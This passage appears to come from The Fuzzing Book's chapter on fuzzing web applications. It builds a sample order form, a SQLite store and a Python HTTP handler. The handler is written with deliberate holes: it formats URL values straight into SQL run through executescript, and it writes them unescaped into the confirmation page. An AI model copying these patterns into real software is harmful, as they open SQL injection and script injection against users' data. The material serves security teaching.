        <span class="s1">&#39;&lt;option value=&quot;</span><span class="si">{item}</span><span class="s1">&quot;&gt;</span><span class="si">{name}</span><span class="s1">&lt;/option&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">item</span><span class="o">=</span><span class="n">item</span><span class="p">,</span>
            <span class="n">name</span><span class="o">=</span><span class="n">FUZZINGBOOK_SWAG</span><span class="p">[</span><span class="n">item</span><span class="p">])</span>

<span class="n">HTML_ORDER_FORM</span> <span class="o">+=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">  &lt;/select&gt;</span>
<span class="s2">  &lt;br&gt;</span>
<span class="s2">  &lt;table&gt;</span>
<span class="s2">  &lt;tr&gt;&lt;td&gt;</span>
<span class="s2">  &lt;label for=&quot;name&quot;&gt;Name: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span>
<span class="s2">  &lt;/td&gt;&lt;td&gt;</span>
<span class="s2">  &lt;label for=&quot;email&quot;&gt;Email: &lt;/label&gt;&lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;&lt;br&gt;</span>
<span class="s2">  &lt;/td&gt;&lt;/tr&gt;</span>
<span class="s2">  &lt;tr&gt;&lt;td&gt;</span>
<span class="s2">  &lt;label for=&quot;city&quot;&gt;City: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;city&quot;&gt;</span>
<span class="s2">  &lt;/td&gt;&lt;td&gt;</span>
<span class="s2">  &lt;label for=&quot;zip&quot;&gt;ZIP Code: &lt;/label&gt;&lt;input type=&quot;number&quot; name=&quot;zip&quot;&gt;</span>
<span class="s2">  &lt;/tr&gt;&lt;/tr&gt;</span>
<span class="s2">  &lt;/table&gt;</span>
<span class="s2">  &lt;input type=&quot;checkbox&quot; name=&quot;terms&quot;&gt;&lt;label for=&quot;terms&quot;&gt;I have read</span>
<span class="s2">  the &lt;a href=&quot;/terms&quot;&gt;terms and conditions&lt;/a&gt;&lt;/label&gt;.&lt;br&gt;</span>
<span class="s2">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Place order&quot;&gt;</span>
<span class="s2">&lt;/p&gt;</span>
<span class="s2">&lt;/form&gt;</span>
<span class="s2">&lt;/body&gt;&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>
</pre></div>
</div>
</div>
</div>
<p>This is what the order form looks like:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">IPython.display</span><span class="w"> </span><span class="kn">import</span> <span class="n">display</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">bookutils</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTML</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">HTML_ORDER_FORM</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<form action="/order" style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Fuzzingbook Swag Order Form</strong>
  <p>
  Yes! Please send me at your earliest convenience
  <select name="item">
  <option value="tshirt">One FuzzingBook T-Shirt</option>
<option value="drill">One FuzzingBook Rotary Hammer</option>
<option value="lockset">One FuzzingBook Lock Set</option>

  </select>
  <br>
  <table>
  <tr><td>
  <label for="name">Name: </label><input type="text" name="name">
  </td><td>
  <label for="email">Email: </label><input type="email" name="email"><br>
  </td></tr>
  <tr><td>
  <label for="city">City: </label><input type="text" name="city">
  </td><td>
  <label for="zip">ZIP Code: </label><input type="number" name="zip">
  </tr></tr>
  </table>
  <input type="checkbox" name="terms"><label for="terms">I have read
  the <a href="/terms">terms and conditions</a></label>.<br>
  <input type="submit" name="submit" value="Place order">
</p>
</form>
</body></html>
</div></div>
</div>
<p>This form is not yet functional, as there is no server behind it; pressing “place order” will lead you to a nonexistent page.</p>
</section>
<section id="order-confirmation">
<h4>Order Confirmation<a class="headerlink" href="#order-confirmation" title="Link to this heading">#</a></h4>
<p>Once we have gotten an order, we show a confirmation page, which is instantiated with the customer information submitted before.  Here is the HTML and the rendering:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML_ORDER_RECEIVED</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;&lt;body&gt;</span>
<span class="s2">&lt;div style=&quot;border:3px; border-style:solid; border-color:#FF0000; padding: 1em;&quot;&gt;</span>
<span class="s2">  &lt;strong id=&quot;title&quot; style=&quot;font-size: x-large&quot;&gt;Thank you for your Fuzzingbook Order!&lt;/strong&gt;</span>
<span class="s2">  &lt;p id=&quot;confirmation&quot;&gt;</span>
<span class="s2">  We will send &lt;strong&gt;</span><span class="si">{item_name}</span><span class="s2">&lt;/strong&gt; to </span><span class="si">{name}</span><span class="s2"> in </span><span class="si">{city}</span><span class="s2">, </span><span class="si">{zip}</span><span class="s2">&lt;br&gt;</span>
<span class="s2">  A confirmation mail will be sent to </span><span class="si">{email}</span><span class="s2">.</span>
<span class="s2">  &lt;/p&gt;</span>
<span class="s2">  &lt;p&gt;</span>
<span class="s2">  Want more swag?  Use our &lt;a href=&quot;/&quot;&gt;order form&lt;/a&gt;!</span>
<span class="s2">  &lt;/p&gt;</span>
<span class="s2">&lt;/div&gt;</span>
<span class="s2">&lt;/body&gt;&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">HTML_ORDER_RECEIVED</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">item_name</span><span class="o">=</span><span class="s2">&quot;One FuzzingBook Rotary Hammer&quot;</span><span class="p">,</span>
                                <span class="n">name</span><span class="o">=</span><span class="s2">&quot;Jane Doe&quot;</span><span class="p">,</span>
                                <span class="n">email</span><span class="o">=</span><span class="s2">&quot;doe@example.com&quot;</span><span class="p">,</span>
                                <span class="n">city</span><span class="o">=</span><span class="s2">&quot;Seattle&quot;</span><span class="p">,</span>
                                <span class="nb">zip</span><span class="o">=</span><span class="s2">&quot;98104&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook Rotary Hammer</strong> to Jane Doe in Seattle, 98104<br>
  A confirmation mail will be sent to doe@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
</section>
<section id="terms-and-conditions">
<h4>Terms and Conditions<a class="headerlink" href="#terms-and-conditions" title="Link to this heading">#</a></h4>
<p>A website can only be complete if it has the necessary legalese.  This page shows some terms and conditions.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML_TERMS_AND_CONDITIONS</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;&lt;body&gt;</span>
<span class="s2">&lt;div style=&quot;border:3px; border-style:solid; border-color:#FF0000; padding: 1em;&quot;&gt;</span>
<span class="s2">  &lt;strong id=&quot;title&quot; style=&quot;font-size: x-large&quot;&gt;Fuzzingbook Terms and Conditions&lt;/strong&gt;</span>
<span class="s2">  &lt;p&gt;</span>
<span class="s2">  The content of this project is licensed under the</span>
<span class="s2">  &lt;a href=&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;&gt;Creative Commons</span>
<span class="s2">  Attribution-NonCommercial-ShareAlike 4.0 International License.&lt;/a&gt;</span>
<span class="s2">  &lt;/p&gt;</span>
<span class="s2">  &lt;p&gt;</span>
<span class="s2">  To place an order, use our &lt;a href=&quot;/&quot;&gt;order form&lt;/a&gt;.</span>
<span class="s2">  &lt;/p&gt;</span>
<span class="s2">&lt;/div&gt;</span>
<span class="s2">&lt;/body&gt;&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">HTML_TERMS_AND_CONDITIONS</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Fuzzingbook Terms and Conditions</strong>
  <p>
  The content of this project is licensed under the
  <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons
  Attribution-NonCommercial-ShareAlike 4.0 International License.</a>
  </p>
  <p>
  To place an order, use our <a href="/">order form</a>.
  </p>
</div>
</body></html>
</div></div>
</div>
</section>
<section id="storing-orders">
<h4>Storing Orders<a class="headerlink" href="#storing-orders" title="Link to this heading">#</a></h4>
<p>To store orders, we make use of a <em>database</em>, stored in the file <code class="docutils literal notranslate"><span class="pre">orders.db</span></code>.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">ORDERS_DB</span> <span class="o">=</span> <span class="s2">&quot;orders.db&quot;</span>
</pre></div>
</div>
</div>
</div>
<p>To interact with the database, we use <em>SQL commands</em>.  The following commands create a table with five text columns for item, name, email, city, and zip – the exact same fields we also use in our HTML form.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">init_db</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">ORDERS_DB</span><span class="p">):</span>
        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">ORDERS_DB</span><span class="p">)</span>

    <span class="n">db_connection</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">ORDERS_DB</span><span class="p">)</span>
    <span class="n">db_connection</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;DROP TABLE IF EXISTS orders&quot;</span><span class="p">)</span>
    <span class="n">db_connection</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE orders &quot;</span>
                          <span class="s2">&quot;(item text, name text, email text, &quot;</span>
                          <span class="s2">&quot;city text, zip text)&quot;</span><span class="p">)</span>
    <span class="n">db_connection</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">db_connection</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">db</span> <span class="o">=</span> <span class="n">init_db</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>At this point, the database is still empty:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[]
</pre></div>
</div>
</div>
</div>
<p>We can add entries using the SQL <code class="docutils literal notranslate"><span class="pre">INSERT</span></code> command:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;INSERT INTO orders &quot;</span> <span class="o">+</span>
           <span class="s2">&quot;VALUES (&#39;lockset&#39;, &#39;Walter White&#39;, &quot;</span>
           <span class="s2">&quot;&#39;white@jpwynne.edu&#39;, &#39;Albuquerque&#39;, &#39;87101&#39;)&quot;</span><span class="p">)</span>
<span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>These values are now in the database:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[(&#39;lockset&#39;, &#39;Walter White&#39;, &#39;white@jpwynne.edu&#39;, &#39;Albuquerque&#39;, &#39;87101&#39;)]
</pre></div>
</div>
</div>
</div>
<p>We can also delete entries from the table again (say, after completion of the order):</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;DELETE FROM orders WHERE name = &#39;Walter White&#39;&quot;</span><span class="p">)</span>
<span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[]
</pre></div>
</div>
</div>
</div>
</section>
<section id="handling-http-requests">
<h4>Handling HTTP Requests<a class="headerlink" href="#handling-http-requests" title="Link to this heading">#</a></h4>
<p>We have an order form and a database; now we need a Web server which brings it all together.  The Python <code class="docutils literal notranslate"><span class="pre">http.server</span></code> module provides everything we need to build a simple HTTP server.  A <code class="docutils literal notranslate"><span class="pre">HTTPRequestHandler</span></code> is an object that takes and processes HTTP requests – in particular, <code class="docutils literal notranslate"><span class="pre">GET</span></code> requests for retrieving Web pages.</p>
<p>We implement the <code class="docutils literal notranslate"><span class="pre">do_GET()</span></code> method that, based on the given path, branches off to serve the requested Web pages.  Requesting the path <code class="docutils literal notranslate"><span class="pre">/</span></code> produces the order form; a path beginning with <code class="docutils literal notranslate"><span class="pre">/order</span></code> sends an order to be processed.  All other requests end in a <code class="docutils literal notranslate"><span class="pre">Page</span> <span class="pre">Not</span> <span class="pre">Found</span></code> message.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># print(&quot;GET &quot; + self.path)</span>
            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s2">&quot;/&quot;</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">send_order_form</span><span class="p">()</span>
            <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;/order&quot;</span><span class="p">):</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">handle_order</span><span class="p">()</span>
            <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;/terms&quot;</span><span class="p">):</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">send_terms_and_conditions</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">not_found</span><span class="p">()</span>
        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">internal_server_error</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<section id="order-form">
<h5>Order Form<a class="headerlink" href="#order-form" title="Link to this heading">#</a></h5>
<p>Accessing the home page (i.e. getting the page at <code class="docutils literal notranslate"><span class="pre">/</span></code>) is simple: We go and serve the <code class="docutils literal notranslate"><span class="pre">html_order_form</span></code> as defined above.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">send_order_form</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">,</span> <span class="s2">&quot;Place your order&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">HTML_ORDER_FORM</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
<p>Likewise, we can send out the terms and conditions:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">send_terms_and_conditions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">,</span> <span class="s2">&quot;Terms and Conditions&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">HTML_TERMS_AND_CONDITIONS</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="processing-orders">
<h5>Processing Orders<a class="headerlink" href="#processing-orders" title="Link to this heading">#</a></h5>
<p>When the user clicks <code class="docutils literal notranslate"><span class="pre">Submit</span></code> on the order form, the Web browser creates and retrieves a URL of the form</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;hostname&gt;/order?field_1=value_1&amp;field_2=value_2&amp;field_3=value_3
</pre></div>
</div>
<p>where each <code class="docutils literal notranslate"><span class="pre">field_i</span></code> is the name of the field in the HTML form, and <code class="docutils literal notranslate"><span class="pre">value_i</span></code> is the value provided by the user.  Values use the CGI encoding we have seen in the <a class="reference internal" href="Coverage.html"><span class="std std-doc">chapter on coverage</span></a> – that is, spaces are converted into <code class="docutils literal notranslate"><span class="pre">+</span></code>, and characters that are not digits or letters are converted into <code class="docutils literal notranslate"><span class="pre">%nn</span></code>, where <code class="docutils literal notranslate"><span class="pre">nn</span></code> is the hexadecimal value of the character.</p>
<p>If Jane Doe <code class="docutils literal notranslate"><span class="pre">&lt;doe&#64;example.com&gt;</span></code> from Seattle orders a T-Shirt, this is the URL the browser creates:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;hostname&gt;/order?item=tshirt&amp;name=Jane+Doe&amp;email=doe%40example.com&amp;city=Seattle&amp;zip=98104
</pre></div>
</div>
<p>When processing a query, the attribute <code class="docutils literal notranslate"><span class="pre">self.path</span></code> of the HTTP request handler holds the path accessed – i.e., everything after <code class="docutils literal notranslate"><span class="pre">&lt;hostname&gt;</span></code>.  The helper method <code class="docutils literal notranslate"><span class="pre">get_field_values()</span></code> takes <code class="docutils literal notranslate"><span class="pre">self.path</span></code> and returns a dictionary of values.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">get_field_values</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Note: this fails to decode non-ASCII characters properly</span>
        <span class="n">query_string</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">query</span>

        <span class="c1"># fields is { &#39;item&#39;: [&#39;tshirt&#39;], &#39;name&#39;: [&#39;Jane Doe&#39;], ...}</span>
        <span class="n">fields</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">parse_qs</span><span class="p">(</span><span class="n">query_string</span><span class="p">,</span> <span class="n">keep_blank_values</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

        <span class="n">values</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">fields</span><span class="p">:</span>
            <span class="n">values</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">fields</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>

        <span class="k">return</span> <span class="n">values</span>
</pre></div>
</div>
</div>
</div>
<p>The method <code class="docutils literal notranslate"><span class="pre">handle_order()</span></code> takes these values from the URL, stores the order, and returns a page confirming the order.  If anything goes wrong, it sends an internal server error.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">handle_order</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">values</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_field_values</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">store_order</span><span class="p">(</span><span class="n">values</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_order_received</span><span class="p">(</span><span class="n">values</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<p>Storing the order makes use of the database connection defined above; we create an SQL command instantiated with the values as extracted from the URL.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">store_order</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
        <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">ORDERS_DB</span><span class="p">)</span>
        <span class="c1"># The following should be one line</span>
        <span class="n">sql_command</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO orders VALUES (&#39;</span><span class="si">{item}</span><span class="s2">&#39;, &#39;</span><span class="si">{name}</span><span class="s2">&#39;, &#39;</span><span class="si">{email}</span><span class="s2">&#39;, &#39;</span><span class="si">{city}</span><span class="s2">&#39;, &#39;</span><span class="si">{zip}</span><span class="s2">&#39;)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="n">values</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">log_message</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">sql_command</span><span class="p">)</span>
        <span class="n">db</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
        <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>After storing the order, we send the confirmation HTML page, which again is instantiated with the values from the URL.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">send_order_received</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
        <span class="c1"># Should use html.escape()</span>
        <span class="n">values</span><span class="p">[</span><span class="s2">&quot;item_name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">FUZZINGBOOK_SWAG</span><span class="p">[</span><span class="n">values</span><span class="p">[</span><span class="s2">&quot;item&quot;</span><span class="p">]]</span>
        <span class="n">confirmation</span> <span class="o">=</span> <span class="n">HTML_ORDER_RECEIVED</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="n">values</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">,</span> <span class="s2">&quot;Order received&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">confirmation</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="other-http-commands">
<h5>Other HTTP commands<a class="headerlink" href="#other-http-commands" title="Link to this heading">#</a></h5>
<p>Besides the <code class="docutils literal notranslate"><span class="pre">GET</span></code> command (which does all the heavy lifting), HTTP servers can also support other HTTP commands; we support the <code class="docutils literal notranslate"><span class="pre">HEAD</span></code> command, which returns the head information of a Web page.  In our case, this is always empty.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">do_HEAD</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># print(&quot;HEAD &quot; + self.path)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
